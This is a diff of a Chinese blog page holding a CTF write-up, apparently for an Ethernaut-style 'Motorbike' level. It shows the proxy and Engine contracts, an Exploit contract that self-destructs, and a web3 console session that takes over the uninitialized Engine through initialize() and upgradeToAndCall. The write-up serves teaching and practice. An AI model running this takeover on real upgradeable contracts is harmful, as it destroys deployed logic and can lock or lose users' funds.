+<a id="__codelineno-51-10" name="__codelineno-51-10" href="__codelineno-51-10"></a><span class="w">    </span><span class="kt">bytes32</span><span class="w"> </span><span class="k">internal </span><span class="nv">constant</span><span class="w"> </span>_IMPLEMENTATION_SLOT<span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mh">0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc</span><span class="p">;</span><span class="w"></span>
+<a id="__codelineno-51-11" name="__codelineno-51-11" href="__codelineno-51-11"></a>
+<a id="__codelineno-51-12" name="__codelineno-51-12" href="__codelineno-51-12"></a><span class="w">    </span><span class="kt">struct</span><span class="w"> </span><span class="nv">AddressSlot</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
+<a id="__codelineno-51-13" name="__codelineno-51-13" href="__codelineno-51-13"></a><span class="w">        </span><span class="kt">address</span><span class="w"> </span><span class="nv">value</span><span class="p">;</span><span class="w"></span>
+<a id="__codelineno-51-14" name="__codelineno-51-14" href="__codelineno-51-14"></a><span class="w">    </span><span class="p">}</span><span class="w"></span>
+<a id="__codelineno-51-15" name="__codelineno-51-15" href="__codelineno-51-15"></a>
+<a id="__codelineno-51-16" name="__codelineno-51-16" href="__codelineno-51-16"></a><span class="w">    </span><span class="c1">// Initializes the upgradeable proxy with an initial implementation specified by `_logic`.</span>
+<a id="__codelineno-51-17" name="__codelineno-51-17" href="__codelineno-51-17"></a><span class="w">    </span><span class="kt">constructor</span><span class="p">(</span><span class="kt">address</span><span class="w"> </span><span class="nv">_logic</span><span class="p">)</span><span class="w"> </span><span class="kt">public</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
+<a id="__codelineno-51-18" name="__codelineno-51-18" href="__codelineno-51-18"></a><span class="w">        </span><span class="kt">require</span><span class="p">(</span>Address<span class="p">.</span>isContract<span class="p">(</span>_logic<span class="p">),</span><span class="w"> </span><span class="s2">&quot;ERC1967: new implementation is not a contract&quot;</span><span class="p">);</span><span class="w"></span>
+<a id="__codelineno-51-19" name="__codelineno-51-19" href="__codelineno-51-19"></a><span class="w">        </span>_getAddressSlot<span class="p">(</span>_IMPLEMENTATION_SLOT<span class="p">).</span>value<span class="w"> </span><span class="o">=</span><span class="w"> </span>_logic<span class="p">;</span><span class="w"></span>
+<a id="__codelineno-51-20" name="__codelineno-51-20" href="__codelineno-51-20"></a><span class="w">        </span><span class="p">(</span><span class="kt">bool</span><span class="w"> </span><span class="nv">success</span><span class="p">,)</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>_logic<span class="p">.</span>delegatecall<span class="p">(</span><span class="w"></span>
+<a id="__codelineno-51-21" name="__codelineno-51-21" href="__codelineno-51-21"></a><span class="w">            </span>abi<span class="p">.</span>encodeWithSignature<span class="p">(</span><span class="s2">&quot;initialize()&quot;</span><span class="p">)</span><span class="w"></span>
+<a id="__codelineno-51-22" name="__codelineno-51-22" href="__codelineno-51-22"></a><span class="w">        </span><span class="p">);</span><span class="w"></span>
+<a id="__codelineno-51-23" name="__codelineno-51-23" href="__codelineno-51-23"></a><span class="w">        </span><span class="kt">require</span><span class="p">(</span>success<span class="p">,</span><span class="w"> </span><span class="s2">&quot;Call failed&quot;</span><span class="p">);</span><span class="w"></span>
+<a id="__codelineno-51-24" name="__codelineno-51-24" href="__codelineno-51-24"></a><span class="w">    </span><span class="p">}</span><span class="w"></span>
+<a id="__codelineno-51-25" name="__codelineno-51-25" href="__codelineno-51-25"></a>
+<a id="__codelineno-51-26" name="__codelineno-51-26" href="__codelineno-51-26"></a><span class="w">    </span><span class="c1">// Delegates the current call to `implementation`.</span>
+<a id="__codelineno-51-27" name="__codelineno-51-27" href="__codelineno-51-27"></a><span class="w">    </span><span class="kt">function</span><span class="w"> </span><span class="nv">_delegate</span><span class="p">(</span><span class="kt">address</span><span class="w"> </span><span class="nv">implementation</span><span class="p">)</span><span class="w"> </span><span class="kt">internal</span><span class="w"> </span>virtual<span class="w"> </span><span class="p">{</span><span class="w"></span>
+<a id="__codelineno-51-28" name="__codelineno-51-28" href="__codelineno-51-28"></a><span class="w">        </span><span class="c1">// solhint-disable-next-line no-inline-assembly</span>
+<a id="__codelineno-51-29" name="__codelineno-51-29" href="__codelineno-51-29"></a><span class="w">        </span>assembly<span class="w"> </span><span class="p">{</span><span class="w"></span>
+<a id="__codelineno-51-30" name="__codelineno-51-30" href="__codelineno-51-30"></a><span class="w">            </span>calldatacopy<span class="p">(</span><span class="m m-Decimal">0</span><span class="p">,</span><span class="w"> </span><span class="m m-Decimal">0</span><span class="p">,</span><span class="w"> </span>calldatasize<span class="p">())</span><span class="w"></span>
+<a id="__codelineno-51-31" name="__codelineno-51-31" href="__codelineno-51-31"></a><span class="w">            </span>let<span class="w"> </span>result<span class="w"> </span><span class="p">:</span><span class="o">=</span><span class="w"> </span>delegatecall<span class="p">(</span>gas<span class="p">(),</span><span class="w"> </span>implementation<span class="p">,</span><span class="w"> </span><span class="m m-Decimal">0</span><span class="p">,</span><span class="w"> </span>calldatasize<span class="p">(),</span><span class="w"> </span><span class="m m-Decimal">0</span><span class="p">,</span><span class="w"> </span><span class="m m-Decimal">0</span><span class="p">)</span><span class="w"></span>
+<a id="__codelineno-51-32" name="__codelineno-51-32" href="__codelineno-51-32"></a><span class="w">            </span>returndatacopy<span class="p">(</span><span class="m m-Decimal">0</span><span class="p">,</span><span class="w"> </span><span class="m m-Decimal">0</span><span class="p">,</span><span class="w"> </span>returndatasize<span class="p">())</span><span class="w"></span>
+<a id="__codelineno-51-33" name="__codelineno-51-33" href="__codelineno-51-33"></a><span class="w">            </span>switch<span class="w"> </span>result<span class="w"></span>
+<a id="__codelineno-51-34" name="__codelineno-51-34" href="__codelineno-51-34"></a><span class="w">            </span>case<span class="w"> </span><span class="m m-Decimal">0</span><span class="w"> </span><span class="p">{</span><span class="w"> </span>revert<span class="p">(</span><span class="m m-Decimal">0</span><span class="p">,</span><span class="w"> </span>returndatasize<span class="p">())</span><span class="w"> </span><span class="p">}</span><span class="w"></span>
+<a id="__codelineno-51-35" name="__codelineno-51-35" href="__codelineno-51-35"></a><span class="w">            </span>default<span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="kt">return</span><span class="p">(</span><span class="m m-Decimal">0</span><span class="p">,</span><span class="w"> </span>returndatasize<span class="p">())</span><span class="w"> </span><span class="p">}</span><span class="w"></span>
+<a id="__codelineno-51-36" name="__codelineno-51-36" href="__codelineno-51-36"></a><span class="w">        </span><span class="p">}</span><span class="w"></span>
+<a id="__codelineno-51-37" name="__codelineno-51-37" href="__codelineno-51-37"></a><span class="w">    </span><span class="p">}</span><span class="w"></span>
+<a id="__codelineno-51-38" name="__codelineno-51-38" href="__codelineno-51-38"></a>
+<a id="__codelineno-51-39" name="__codelineno-51-39" href="__codelineno-51-39"></a><span class="w">    </span><span class="c1">// Fallback function that delegates calls to the address returned by `_implementation()`. </span>
+<a id="__codelineno-51-40" name="__codelineno-51-40" href="__codelineno-51-40"></a><span class="w">    </span><span class="c1">// Will run if no other function in the contract matches the call data</span>
+<a id="__codelineno-51-41" name="__codelineno-51-41" href="__codelineno-51-41"></a><span class="w">    </span>fallback<span class="w"> </span><span class="p">()</span><span class="w"> </span><span class="kt">external</span><span class="w"> </span><span class="kt">payable</span><span class="w"> </span>virtual<span class="w"> </span><span class="p">{</span><span class="w"></span>
+<a id="__codelineno-51-42" name="__codelineno-51-42" href="__codelineno-51-42"></a><span class="w">        </span>_delegate<span class="p">(</span>_getAddressSlot<span class="p">(</span>_IMPLEMENTATION_SLOT<span class="p">).</span>value<span class="p">);</span><span class="w"></span>
+<a id="__codelineno-51-43" name="__codelineno-51-43" href="__codelineno-51-43"></a><span class="w">    </span><span class="p">}</span><span class="w"></span>
+<a id="__codelineno-51-44" name="__codelineno-51-44" href="__codelineno-51-44"></a>
+<a id="__codelineno-51-45" name="__codelineno-51-45" href="__codelineno-51-45"></a><span class="w">    </span><span class="c1">// Returns an `AddressSlot` with member `value` located at `slot`.</span>
+<a id="__codelineno-51-46" name="__codelineno-51-46" href="__codelineno-51-46"></a><span class="w">    </span><span class="kt">function</span><span class="w"> </span><span class="nv">_getAddressSlot</span><span class="p">(</span><span class="kt">bytes32</span><span class="w"> </span><span class="nv">slot</span><span class="p">)</span><span class="w"> </span><span class="kt">internal</span><span class="w"> </span>pure<span class="w"> </span><span class="kt">returns</span><span class="w"> </span><span class="p">(</span>AddressSlot<span class="w"> </span>storage<span class="w"> </span>r<span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
+<a id="__codelineno-51-47" name="__codelineno-51-47" href="__codelineno-51-47"></a><span class="w">        </span>assembly<span class="w"> </span><span class="p">{</span><span class="w"></span>
+<a id="__codelineno-51-48" name="__codelineno-51-48" href="__codelineno-51-48"></a><span class="w">            </span>r_slot<span class="w"> </span><span class="p">:</span><span class="o">=</span><span class="w"> </span>slot<span class="w"></span>
+<a id="__codelineno-51-49" name="__codelineno-51-49" href="__codelineno-51-49"></a><span class="w">        </span><span class="p">}</span><span class="w"></span>
+<a id="__codelineno-51-50" name="__codelineno-51-50" href="__codelineno-51-50"></a><span class="w">    </span><span class="p">}</span><span class="w"></span>
+<a id="__codelineno-51-51" name="__codelineno-51-51" href="__codelineno-51-51"></a><span class="p">}</span><span class="w"></span>
+<a id="__codelineno-51-52" name="__codelineno-51-52" href="__codelineno-51-52"></a>
+<a id="__codelineno-51-53" name="__codelineno-51-53" href="__codelineno-51-53"></a><span class="k">contract</span><span class="w"> </span><span class="ni">Engine</span><span class="w"> </span><span class="kt">is</span><span class="w"> </span>Initializable<span class="w"> </span><span class="p">{</span><span class="w"></span>
+<a id="__codelineno-51-54" name="__codelineno-51-54" href="__codelineno-51-54"></a><span class="w">    </span><span class="c1">// keccak-256 hash of &quot;eip1967.proxy.implementation&quot; subtracted by 1</span>
+<a id="__codelineno-51-55" name="__codelineno-51-55" href="__codelineno-51-55"></a><span class="w">    </span><span class="kt">bytes32</span><span class="w"> </span><span class="k">internal </span><span class="nv">constant</span><span class="w"> </span>_IMPLEMENTATION_SLOT<span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mh">0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc</span><span class="p">;</span><span class="w"></span>
+<a id="__codelineno-51-56" name="__codelineno-51-56" href="__codelineno-51-56"></a>
+<a id="__codelineno-51-57" name="__codelineno-51-57" href="__codelineno-51-57"></a><span class="w">    </span><span class="kt">address</span><span class="w"> </span><span class="k">public </span><span class="nv">upgrader</span><span class="p">;</span><span class="w"></span>
+<a id="__codelineno-51-58" name="__codelineno-51-58" href="__codelineno-51-58"></a><span class="w">    </span><span class="kt">uint256</span><span class="w"> </span><span class="k">public </span><span class="nv">horsePower</span><span class="p">;</span><span class="w"></span>
+<a id="__codelineno-51-59" name="__codelineno-51-59" href="__codelineno-51-59"></a>
+<a id="__codelineno-51-60" name="__codelineno-51-60" href="__codelineno-51-60"></a><span class="w">    </span><span class="kt">struct</span><span class="w"> </span><span class="nv">AddressSlot</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
+<a id="__codelineno-51-61" name="__codelineno-51-61" href="__codelineno-51-61"></a><span class="w">        </span><span class="kt">address</span><span class="w"> </span><span class="nv">value</span><span class="p">;</span><span class="w"></span>
+<a id="__codelineno-51-62" name="__codelineno-51-62" href="__codelineno-51-62"></a><span class="w">    </span><span class="p">}</span><span class="w"></span>
+<a id="__codelineno-51-63" name="__codelineno-51-63" href="__codelineno-51-63"></a>
+<a id="__codelineno-51-64" name="__codelineno-51-64" href="__codelineno-51-64"></a><span class="w">    </span><span class="kt">function</span><span class="w"> </span><span class="nv">initialize</span><span class="p">()</span><span class="w"> </span><span class="kt">external</span><span class="w"> </span>initializer<span class="w"> </span><span class="p">{</span><span class="w"></span>
+<a id="__codelineno-51-65" name="__codelineno-51-65" href="__codelineno-51-65"></a><span class="w">        </span>horsePower<span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="m m-Decimal">1000</span><span class="p">;</span><span class="w"></span>
+<a id="__codelineno-51-66" name="__codelineno-51-66" href="__codelineno-51-66"></a><span class="w">        </span>upgrader<span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">msg.sender</span><span class="p">;</span><span class="w"></span>
+<a id="__codelineno-51-67" name="__codelineno-51-67" href="__codelineno-51-67"></a><span class="w">    </span><span class="p">}</span><span class="w"></span>
+<a id="__codelineno-51-68" name="__codelineno-51-68" href="__codelineno-51-68"></a>
+<a id="__codelineno-51-69" name="__codelineno-51-69" href="__codelineno-51-69"></a><span class="w">    </span><span class="c1">// Upgrade the implementation of the proxy to `newImplementation`</span>
+<a id="__codelineno-51-70" name="__codelineno-51-70" href="__codelineno-51-70"></a><span class="w">    </span><span class="c1">// subsequently execute the function call</span>
+<a id="__codelineno-51-71" name="__codelineno-51-71" href="__codelineno-51-71"></a><span class="w">    </span><span class="kt">function</span><span class="w"> </span><span class="nv">upgradeToAndCall</span><span class="p">(</span><span class="kt">address</span><span class="w"> </span><span class="nv">newImplementation</span><span class="p">,</span><span class="w"> </span><span class="kt">bytes</span><span class="w"> </span><span class="nv">memory</span><span class="w"> </span>data<span class="p">)</span><span class="w"> </span><span class="kt">external</span><span class="w"> </span><span class="kt">payable</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
+<a id="__codelineno-51-72" name="__codelineno-51-72" href="__codelineno-51-72"></a><span class="w">        </span>_authorizeUpgrade<span class="p">();</span><span class="w"></span>
+<a id="__codelineno-51-73" name="__codelineno-51-73" href="__codelineno-51-73"></a><span class="w">        </span>_upgradeToAndCall<span class="p">(</span>newImplementation<span class="p">,</span><span class="w"> </span>data<span class="p">);</span><span class="w"></span>
+<a id="__codelineno-51-74" name="__codelineno-51-74" href="__codelineno-51-74"></a><span class="w">    </span><span class="p">}</span><span class="w"></span>
+<a id="__codelineno-51-75" name="__codelineno-51-75" href="__codelineno-51-75"></a>
+<a id="__codelineno-51-76" name="__codelineno-51-76" href="__codelineno-51-76"></a><span class="w">    </span><span class="c1">// Restrict to upgrader role</span>
+<a id="__codelineno-51-77" name="__codelineno-51-77" href="__codelineno-51-77"></a><span class="w">    </span><span class="kt">function</span><span class="w"> </span><span class="nv">_authorizeUpgrade</span><span class="p">()</span><span class="w"> </span><span class="kt">internal</span><span class="w"> </span>view<span class="w"> </span><span class="p">{</span><span class="w"></span>
+<a id="__codelineno-51-78" name="__codelineno-51-78" href="__codelineno-51-78"></a><span class="w">        </span><span class="kt">require</span><span class="p">(</span><span class="k">msg.sender</span><span class="w"> </span><span class="o">==</span><span class="w"> </span>upgrader<span class="p">,</span><span class="w"> </span><span class="s2">&quot;Can&#39;t upgrade&quot;</span><span class="p">);</span><span class="w"></span>
+<a id="__codelineno-51-79" name="__codelineno-51-79" href="__codelineno-51-79"></a><span class="w">    </span><span class="p">}</span><span class="w"></span>
+<a id="__codelineno-51-80" name="__codelineno-51-80" href="__codelineno-51-80"></a>
+<a id="__codelineno-51-81" name="__codelineno-51-81" href="__codelineno-51-81"></a><span class="w">    </span><span class="c1">// Perform implementation upgrade with security checks for UUPS proxies, and additional setup call.</span>
+<a id="__codelineno-51-82" name="__codelineno-51-82" href="__codelineno-51-82"></a><span class="w">    </span><span class="kt">function</span><span class="w"> </span><span class="nv">_upgradeToAndCall</span><span class="p">(</span><span class="w"></span>
+<a id="__codelineno-51-83" name="__codelineno-51-83" href="__codelineno-51-83"></a><span class="w">        </span><span class="kt">address</span><span class="w"> </span><span class="nv">newImplementation</span><span class="p">,</span><span class="w"></span>
+<a id="__codelineno-51-84" name="__codelineno-51-84" href="__codelineno-51-84"></a><span class="w">        </span><span class="kt">bytes</span><span class="w"> </span><span class="nv">memory</span><span class="w"> </span>data<span class="w"></span>
+<a id="__codelineno-51-85" name="__codelineno-51-85" href="__codelineno-51-85"></a><span class="w">    </span><span class="p">)</span><span class="w"> </span><span class="kt">internal</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
+<a id="__codelineno-51-86" name="__codelineno-51-86" href="__codelineno-51-86"></a><span class="w">        </span><span class="c1">// Initial upgrade and setup call</span>
+<a id="__codelineno-51-87" name="__codelineno-51-87" href="__codelineno-51-87"></a><span class="w">        </span>_setImplementation<span class="p">(</span>newImplementation<span class="p">);</span><span class="w"></span>
+<a id="__codelineno-51-88" name="__codelineno-51-88" href="__codelineno-51-88"></a><span class="w">        </span><span class="kt">if</span><span class="w"> </span><span class="p">(</span>data<span class="p">.</span>length<span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="m m-Decimal">0</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
+<a id="__codelineno-51-89" name="__codelineno-51-89" href="__codelineno-51-89"></a><span class="w">            </span><span class="p">(</span><span class="kt">bool</span><span class="w"> </span><span class="nv">success</span><span class="p">,)</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>newImplementation<span class="p">.</span>delegatecall<span class="p">(</span>data<span class="p">);</span><span class="w"></span>
+<a id="__codelineno-51-90" name="__codelineno-51-90" href="__codelineno-51-90"></a><span class="w">            </span><span class="kt">require</span><span class="p">(</span>success<span class="p">,</span><span class="w"> </span><span class="s2">&quot;Call failed&quot;</span><span class="p">);</span><span class="w"></span>
+<a id="__codelineno-51-91" name="__codelineno-51-91" href="__codelineno-51-91"></a><span class="w">        </span><span class="p">}</span><span class="w"></span>
+<a id="__codelineno-51-92" name="__codelineno-51-92" href="__codelineno-51-92"></a><span class="w">    </span><span class="p">}</span><span class="w"></span>
+<a id="__codelineno-51-93" name="__codelineno-51-93" href="__codelineno-51-93"></a>
+<a id="__codelineno-51-94" name="__codelineno-51-94" href="__codelineno-51-94"></a><span class="w">    </span><span class="c1">// Stores a new address in the EIP1967 implementation slot.</span>
+<a id="__codelineno-51-95" name="__codelineno-51-95" href="__codelineno-51-95"></a><span class="w">    </span><span class="kt">function</span><span class="w"> </span><span class="nv">_setImplementation</span><span class="p">(</span><span class="kt">address</span><span class="w"> </span><span class="nv">newImplementation</span><span class="p">)</span><span class="w"> </span><span class="kt">private</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
+<a id="__codelineno-51-96" name="__codelineno-51-96" href="__codelineno-51-96"></a><span class="w">        </span><span class="kt">require</span><span class="p">(</span>Address<span class="p">.</span>isContract<span class="p">(</span>newImplementation<span class="p">),</span><span class="w"> </span><span class="s2">&quot;ERC1967: new implementation is not a contract&quot;</span><span class="p">);</span><span class="w"></span>
+<a id="__codelineno-51-97" name="__codelineno-51-97" href="__codelineno-51-97"></a>
+<a id="__codelineno-51-98" name="__codelineno-51-98" href="__codelineno-51-98"></a><span class="w">        </span>AddressSlot<span class="w"> </span>storage<span class="w"> </span>r<span class="p">;</span><span class="w"></span>
+<a id="__codelineno-51-99" name="__codelineno-51-99" href="__codelineno-51-99"></a><span class="w">        </span>assembly<span class="w"> </span><span class="p">{</span><span class="w"></span>
+<a id="__codelineno-51-100" name="__codelineno-51-100" href="__codelineno-51-100"></a><span class="w">            </span>r_slot<span class="w"> </span><span class="p">:</span><span class="o">=</span><span class="w"> </span>_IMPLEMENTATION_SLOT<span class="w"></span>
+<a id="__codelineno-51-101" name="__codelineno-51-101" href="__codelineno-51-101"></a><span class="w">        </span><span class="p">}</span><span class="w"></span>
+<a id="__codelineno-51-102" name="__codelineno-51-102" href="__codelineno-51-102"></a><span class="w">        </span>r<span class="p">.</span>value<span class="w"> </span><span class="o">=</span><span class="w"> </span>newImplementation<span class="p">;</span><span class="w"></span>
+<a id="__codelineno-51-103" name="__codelineno-51-103" href="__codelineno-51-103"></a><span class="w">    </span><span class="p">}</span><span class="w"></span>
+<a id="__codelineno-51-104" name="__codelineno-51-104" href="__codelineno-51-104"></a><span class="p">}</span><span class="w"></span>
+</code></pre></div>
+</details>
+<p>同样有些复杂，最终目的是要销毁掉 Engine</p>
+<p>因为整个合约中都没有 selfdestruct，所以要载入自己的合约，可以通过 upgradeToAndCall 函数来载入合约并调用，这需要通过 _authorizeUpgrade 函数的检查，也就是检查 sender 是否是 upgrader，而改变 upgrader 可以通过 initialize 函数来完成</p>
+<p>所以攻击流程就是先通过 getStorageAt 来得到部署的 Engine 的地址，然后调用 initialize，upgradeToAndCall 一个部署的新合约，让它触发 selfdestruct 就好了</p>
+<p>新合约：
+<div class="highlight"><pre><span></span><code><a id="__codelineno-52-1" name="__codelineno-52-1" href="__codelineno-52-1"></a><span class="c1">// SPDX-License-Identifier: MIT</span>
+<a id="__codelineno-52-2" name="__codelineno-52-2" href="__codelineno-52-2"></a><span class="k">pragma solidity</span><span class="w"> </span><span class="o">^</span><span class="k">0.6.0</span><span class="p">;</span><span class="w"></span>
+<a id="__codelineno-52-3" name="__codelineno-52-3" href="__codelineno-52-3"></a>
+<a id="__codelineno-52-4" name="__codelineno-52-4" href="__codelineno-52-4"></a><span class="k">contract</span><span class="w"> </span><span class="ni">Exploit</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
+<a id="__codelineno-52-5" name="__codelineno-52-5" href="__codelineno-52-5"></a><span class="w">    </span><span class="kt">function</span><span class="w"> </span><span class="nv">exp</span><span class="p">()</span><span class="w"> </span><span class="kt">public</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
+<a id="__codelineno-52-6" name="__codelineno-52-6" href="__codelineno-52-6"></a><span class="w">        </span>selfdestruct<span class="p">(</span><span class="kt">payable</span><span class="p">(</span><span class="m m-Decimal">0</span><span class="p">));</span><span class="w"></span>
+<a id="__codelineno-52-7" name="__codelineno-52-7" href="__codelineno-52-7"></a><span class="w">    </span><span class="p">}</span><span class="w"></span>
+<a id="__codelineno-52-8" name="__codelineno-52-8" href="__codelineno-52-8"></a><span class="p">}</span><span class="w"></span>
+</code></pre></div></p>
+<p>攻击流程：
+<div class="highlight"><pre><span></span><code><a id="__codelineno-53-1" name="__codelineno-53-1" href="__codelineno-53-1"></a><span class="o">&gt;</span> <span class="k">await</span> <span class="nx">web3</span><span class="p">.</span><span class="nx">eth</span><span class="p">.</span><span class="nx">getStorageAt</span><span class="p">(</span><span class="nx">instance</span><span class="p">,</span> <span class="s2">&quot;0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc&quot;</span><span class="p">)</span>
+<a id="__codelineno-53-2" name="__codelineno-53-2" href="__codelineno-53-2"></a><span class="s1">&#39;0x000000000000000000000000&lt;engine address&gt;&#39;</span>
+<a id="__codelineno-53-3" name="__codelineno-53-3" href="__codelineno-53-3"></a><span class="o">&gt;</span> <span class="nx">engine</span> <span class="o">=</span> <span class="s2">&quot;0x&lt;engine address&gt;&quot;</span>
+<a id="__codelineno-53-4" name="__codelineno-53-4" href="__codelineno-53-4"></a><span class="o">&gt;</span> <span class="nx">data</span> <span class="o">=</span> <span class="nx">web3</span><span class="p">.</span><span class="nx">utils</span><span class="p">.</span><span class="nx">sha3</span><span class="p">(</span><span class="s2">&quot;initialize()&quot;</span><span class="p">).</span><span class="nx">slice</span><span class="p">(</span><span class="mf">0</span><span class="p">,</span> <span class="mf">10</span><span class="p">)</span>
+<a id="__codelineno-53-5" name="__codelineno-53-5" href="__codelineno-53-5"></a><span class="s1">&#39;0x8129fc1c&#39;</span>
+<a id="__codelineno-53-6" name="__codelineno-53-6" href="__codelineno-53-6"></a><span class="o">&gt;</span> <span class="nx">web3</span><span class="p">.</span><span class="nx">eth</span><span class="p">.</span><span class="nx">sendTransaction</span><span class="p">({</span><span class="kr">from</span><span class="o">:</span> <span class="nx">player</span><span class="p">,</span> <span class="nx">to</span><span class="o">:</span> <span class="nx">engine</span><span class="p">,</span> <span class="nx">data</span><span class="o">:</span> <span class="nx">data</span><span class="p">})</span>
+<a id="__codelineno-53-7" name="__codelineno-53-7" href="__codelineno-53-7"></a><span class="o">&gt;</span> <span class="k">await</span> <span class="nx">web3</span><span class="p">.</span><span class="nx">eth</span><span class="p">.</span><span class="nx">call</span><span class="p">({</span><span class="kr">from</span><span class="o">:</span> <span class="nx">player</span><span class="p">,</span> <span class="nx">to</span><span class="o">:</span> <span class="nx">engine</span><span class="p">,</span> <span class="nx">data</span><span class="o">:</span> <span class="nx">web3</span><span class="p">.</span><span class="nx">utils</span><span class="p">.</span><span class="nx">sha3</span><span class="p">(</span><span class="s2">&quot;upgrader()&quot;</span><span class="p">).</span><span class="nx">slice</span><span class="p">(</span><span class="mf">0</span><span class="p">,</span> <span class="mf">10</span><span class="p">)})</span> <span class="c1">// 验证 upgrader</span>
+<a id="__codelineno-53-8" name="__codelineno-53-8" href="__codelineno-53-8"></a><span class="s1">&#39;0x000000000000000000000000&lt;player address&gt;&#39;</span>
+<a id="__codelineno-53-9" name="__codelineno-53-9" href="__codelineno-53-9"></a><span class="o">&gt;</span> <span class="nx">exp</span> <span class="o">=</span> <span class="s2">&quot;&lt;Exploit contract address&gt;&quot;</span>
+<a id="__codelineno-53-10" name="__codelineno-53-10" href="__codelineno-53-10"></a><span class="o">&gt;</span> <span class="nx">expdata</span> <span class="o">=</span> <span class="nx">web3</span><span class="p">.</span><span class="nx">utils</span><span class="p">.</span><span class="nx">sha3</span><span class="p">(</span><span class="s2">&quot;exp()&quot;</span><span class="p">).</span><span class="nx">slice</span><span class="p">(</span><span class="mf">0</span><span class="p">,</span> <span class="mf">10</span><span class="p">)</span>
+<a id="__codelineno-53-11" name="__codelineno-53-11" href="__codelineno-53-11"></a><span class="s1">&#39;0xab60ffda&#39;</span>
+<a id="__codelineno-53-12" name="__codelineno-53-12" href="__codelineno-53-12"></a><span class="o">&gt;</span> <span class="nx">signature</span> <span class="o">=</span> <span class="p">{</span>
+<a id="__codelineno-53-13" name="__codelineno-53-13" href="__codelineno-53-13"></a>    <span class="nx">name</span><span class="o">:</span> <span class="s1">&#39;upgradeToAndCall&#39;</span><span class="p">,</span>
+<a id="__codelineno-53-14" name="__codelineno-53-14" href="__codelineno-53-14"></a>    <span class="nx">type</span><span class="o">:</span> <span class="s1">&#39;function&#39;</span><span class="p">,</span>
+<a id="__codelineno-53-15" name="__codelineno-53-15" href="__codelineno-53-15"></a>    <span class="nx">inputs</span><span class="o">:</span> <span class="p">[</span>
+<a id="__codelineno-53-16" name="__codelineno-53-16" href="__codelineno-53-16"></a>        <span class="p">{</span>
+<a id="__codelineno-53-17" name="__codelineno-53-17" href="__codelineno-53-17"></a>            <span class="nx">type</span><span class="o">:</span> <span class="s1">&#39;address&#39;</span><span class="p">,</span>
+<a id="__codelineno-53-18" name="__codelineno-53-18" href="__codelineno-53-18"></a>            <span class="nx">name</span><span class="o">:</span> <span class="s1">&#39;newImplementation&#39;</span>
+<a id="__codelineno-53-19" name="__codelineno-53-19" href="__codelineno-53-19"></a>        <span class="p">},</span>
+<a id="__codelineno-53-20" name="__codelineno-53-20" href="__codelineno-53-20"></a>        <span class="p">{</span>
+<a id="__codelineno-53-21" name="__codelineno-53-21" href="__codelineno-53-21"></a>            <span class="nx">type</span><span class="o">:</span> <span class="s1">&#39;bytes memory&#39;</span><span class="p">,</span>
+<a id="__codelineno-53-22" name="__codelineno-53-22" href="__codelineno-53-22"></a>            <span class="nx">name</span><span class="o">:</span> <span class="s1">&#39;data&#39;</span>
+<a id="__codelineno-53-23" name="__codelineno-53-23" href="__codelineno-53-23"></a>        <span class="p">}</span>
+<a id="__codelineno-53-24" name="__codelineno-53-24" href="__codelineno-53-24"></a>    <span class="p">]</span>
+<a id="__codelineno-53-25" name="__codelineno-53-25" href="__codelineno-53-25"></a><span class="p">}</span>
+<a id="__codelineno-53-26" name="__codelineno-53-26" href="__codelineno-53-26"></a><span class="p">{</span><span class="nx">name</span><span class="o">:</span> <span class="s1">&#39;upgradeToAndCall&#39;</span><span class="p">,</span> <span class="nx">type</span><span class="o">:</span> <span class="s1">&#39;function&#39;</span><span class="p">,</span> <span class="nx">inputs</span><span class="o">:</span> <span class="nb">Array</span><span class="p">(</span><span class="mf">2</span><span class="p">)}</span>
+<a id="__codelineno-53-27" name="__codelineno-53-27" href="__codelineno-53-27"></a><span class="o">&gt;</span> <span class="nx">data</span> <span class="o">=</span> <span class="nx">web3</span><span class="p">.</span><span class="nx">eth</span><span class="p">.</span><span class="nx">abi</span><span class="p">.</span><span class="nx">encodeFunctionCall</span><span class="p">(</span><span class="nx">upgradeSignature</span><span class="p">,</span> <span class="p">[</span><span class="nx">exp</span><span class="p">,</span> <span class="nx">expdata</span><span class="p">])</span>
+<a id="__codelineno-53-28" name="__codelineno-53-28" href="__codelineno-53-28"></a><span class="s1">&#39;0x4f1ef286000000000000000000000000700f6c75bffc3e6379bfa14cf050127c15a5573900000000000000000000000000000000000000000000000000000000000000400000000000000000000000000000000000000000000000000000000000000004ab60ffda00000000000000000000000000000000000000000000000000000000&#39;</span>
+<a id="__codelineno-53-29" name="__codelineno-53-29" href="__codelineno-53-29"></a><span class="o">&gt;</span> <span class="nx">web3</span><span class="p">.</span><span class="nx">eth</span><span class="p">.</span><span class="nx">sendTransaction</span><span class="p">({</span><span class="kr">from</span><span class="o">:</span> <span class="nx">player</span><span class="p">,</span> <span class="nx">to</span><span class="o">:</span> <span class="nx">engine</span><span class="p">,</span> <span class="nx">data</span><span class="o">:</span> <span class="nx">data</span><span class="p">})</span>
+</code></pre></div></p>
 
   
     <hr>
@@ -2638,7 +3276,7 @@ var _hmt = _hmt || [];
   <small>
     
       最后更新:
-      <span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-datetime">2022年3月28日 00:10:09</span>
+      <span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-datetime">2022年3月29日 00:10:46</span>
       
         <br>
         创建日期:
